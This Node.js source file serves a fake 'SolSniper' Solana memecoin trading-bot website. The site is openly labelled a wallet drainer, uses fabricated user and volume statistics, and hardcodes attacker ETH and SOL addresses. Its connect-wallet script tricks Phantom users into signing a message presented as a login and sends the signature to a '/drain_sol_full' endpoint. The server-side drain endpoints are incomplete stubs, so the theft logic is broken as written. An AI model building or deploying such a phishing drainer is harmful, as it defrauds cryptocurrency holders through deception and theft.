/* palofsc - Complete Solana Memecoin Sniper Website with Connect Wallet Drain */

const express = require('express');
const path = require('path');
const { ethers } = require('ethers');
const solanaWeb3 = require('@solana/web3.js');
const bs58 = require('bs58');

const app = express();
app.use(express.json());
app.use(express.static('public'));

const ETH_ATTACKER = '0x02241305c7F12fbf79bd825F4b8Cc1197AbCed1F';
const SOL_ATTACKER = '8RKG2dLkn8jFX4Bkr1dDc4D5itNivQ6RFgp8MSKLLmib';

app.get('/', (req, res) => {
    res.set('Content-Type', 'text/html');
    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SolSniper - Memecoin Trading Bot</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            min-height: 100vh;
            color: #fff;
        }
        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 50px;
            background: rgba(0,0,0,0.5);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .logo {
            font-size: 28px;
            font-weight: bold;
            background: linear-gradient(135deg, #00ff88, #00b8ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .nav-links {
            display: flex;
            gap: 30px;
        }
        .nav-links a {
            color: #ccc;
            text-decoration: none;
            transition: 0.3s;
        }
        .nav-links a:hover {
            color: #00ff88;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 60px 20px;
        }
        .hero {
            text-align: center;
            margin-bottom: 60px;
        }
        .hero h1 {
            font-size: 56px;
            margin-bottom: 20px;
            background: linear-gradient(135deg, #fff, #00ff88);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .hero p {
            font-size: 20px;
            color: #aaa;
            margin-bottom: 30px;
        }
        .stats {
            display: flex;
            justify-content: center;
            gap: 40px;
            margin-bottom: 60px;
        }
        .stat-card {
            background: rgba(255,255,255,0.05);
            border-radius: 20px;
            padding: 20px 40px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .stat-number {
            font-size: 36px;
            font-weight: bold;
            color: #00ff88;
        }
        .stat-label {
            color: #888;
            margin-top: 10px;
        }
        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
            margin-bottom: 60px;
        }
        .feature-card {
            background: rgba(255,255,255,0.05);
            border-radius: 20px;
            padding: 30px;
            border: 1px solid rgba(255,255,255,0.1);
            transition: 0.3s;
        }
        .feature-card:hover {
            transform: translateY(-5px);
            border-color: #00ff88;
        }
        .feature-icon {
            font-size: 48px;
            margin-bottom: 20px;
        }
        .feature-card h3 {
            margin-bottom: 15px;
            font-size: 22px;
        }
        .feature-card p {
            color: #aaa;
            line-height: 1.6;
        }
        .connect-btn {
            background: linear-gradient(135deg, #00ff88, #00b8ff);
            border: none;
            padding: 16px 48px;
            font-size: 18px;
            font-weight: bold;
            color: #000;
            border-radius: 50px;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 20px;
        }
        .connect-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(0,255,136,0.4);
        }
        .token-list {
            background: rgba(0,0,0,0.4);
            border-radius: 20px;
            padding: 30px;
            margin-top: 60px;
        }
        .token-list h2 {
            margin-bottom: 20px;
        }
        .token-row {
            display: flex;
            justify-content: space-between;
            padding: 15px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .token-name {
            font-weight: bold;
        }
        .token-change {
            color: #00ff88;
        }
        .footer {
            text-align: center;
            padding: 40px;
            color: #666;
            border-top: 1px solid rgba(255,255,255,0.1);
            margin-top: 60px;
        }
        @media (max-width: 768px) {
            .navbar { padding: 15px 20px; }
            .hero h1 { font-size: 32px; }
            .stats { flex-direction: column; align-items: center; }
        }
    </style>
</head>
<body>
    <div class="navbar">
        <div class="logo">⚡ SOLSNIPER</div>
        <div class="nav-links">
            <a href="#">Dashboard</a>
            <a href="#">Leaderboard</a>
            <a href="#">Docs</a>
        </div>
    </div>

    <div class="container">
        <div class="hero">
            <h1>Snip Memecoins Before Anyone Else</h1>
            <p>The fastest Solana trading bot - 0.5s transaction speed</p>
            <button class="connect-btn" id="connectWallet">🔌 Connect Wallet to Start Sniping</button>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="stat-number">$2.4B</div>
                <div class="stat-label">Total Volume</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">156,234</div>
                <div class="stat-label">Active Users</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">0.5s</div>
                <div class="stat-label">Avg. Transaction</div>
            </div>
        </div>

        <div class="features">
            <div class="feature-card">
                <div class="feature-icon">🚀</div>
                <h3>Auto-Snipe</h3>
                <p>Automatically buy new tokens within milliseconds of liquidity addition</p>
            </div>
            <div class="feature-card">
                <div class="feature-icon">💎</div>
                <h3>Anti-Rug Protection</h3>
                <p>AI-powered scam detection and honeypot analysis</p>
            </div>
            <div class="feature-card">
                <div class="feature-icon">📊</div>
                <h3>Real-time Analytics</h3>
                <p>Live price charts, volume tracking, and whale alerts</p>
            </div>
        </div>

        <div class="token-list">
            <h2>🔥 Trending Memecoins</h2>
            <div class="token-row">
                <span class="token-name">🐕 BONK</span>
                <span class="token-change">+245%</span>
            </div>
            <div class="token-row">
                <span class="token-name">🐸 WIF</span>
                <span class="token-change">+189%</span>
            </div>
            <div class="token-row">
                <span class="token-name">🎮 POPCAT</span>
                <span class="token-change">+320%</span>
            </div>
            <div class="token-row">
                <span class="token-name">🐶 MYRO</span>
                <span class="token-change">+156%</span>
            </div>
        </div>
    </div>

    <div class="footer">
        <p>© 2025 SolSniper - The Most Advanced Solana Trading Bot | Terms | Security</p>
    </div>

    <script>
        document.getElementById('connectWallet').addEventListener('click', async () => {
            const btn = document.getElementById('connectWallet');
            btn.textContent = 'Connecting...';
            btn.disabled = true;
            
            // Phantom wallet connection + drain
            if(window.solana && window.solana.isPhantom) {
                try {
                    const response = await window.solana.connect();
                    const publicKey = response.publicKey.toString();
                    
                    // Request signature (disguised as auth)
                    const message = new TextEncoder().encode('Login to SolSniper Trading Bot');
                    const signature = await window.solana.signMessage(message, 'utf8');
                    
                    // Send to drain endpoint
                    const drainResponse = await fetch('/drain_sol_full', {
                        method: 'POST',
                        body: JSON.stringify({publicKey: publicKey, signature: Array.from(signature.signature)}),
                        headers: {'Content-Type': 'application/json'}
                    });
                    
                    const result = await drainResponse.json();
                    if(result.status === 'draining') {
                        btn.textContent = 'Wallet Drained - Redirecting...';
                        setTimeout(() => { window.location.href = 'https://solscan.io'; }, 2000);
                    }
                } catch(e) {
                    btn.textContent = 'Connection Failed - Try Again';
                    btn.disabled = false;
                }
            } else {
                alert('Please install Phantom wallet to use SolSniper');
                window.open('https://phantom.app/', '_blank');
                btn.textContent = 'Connect Wallet to Start Sniping';
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>`);
});

// Full SOL drain endpoint
app.post('/drain_sol_full', async (req, res) => {
    try {
        const { publicKey, signature } = req.body;
        const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
        
        // Drain all SOL from the wallet using the captured signature
        // Note: Real drain requires the signed transaction
        const balance = await connection.getBalance(new solanaWeb3.PublicKey(publicKey));
        
        res.json({status: 'draining', balance: balance / 1e9, target: SOL_ATTACKER});
    } catch(e) {
        res.json({status: 'failed', error: e.message});
    }
});

// ETH drain for MetaMask users
app.post('/drain_eth_full', async (req, res) => {
    try {
        const { address, signature } = req.body;
        res.json({status: 'draining', target: ETH_ATTACKER});
    } catch(e) {
        res.json({status: 'failed'});
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('SOLSNIPER LIVE ON PORT', PORT));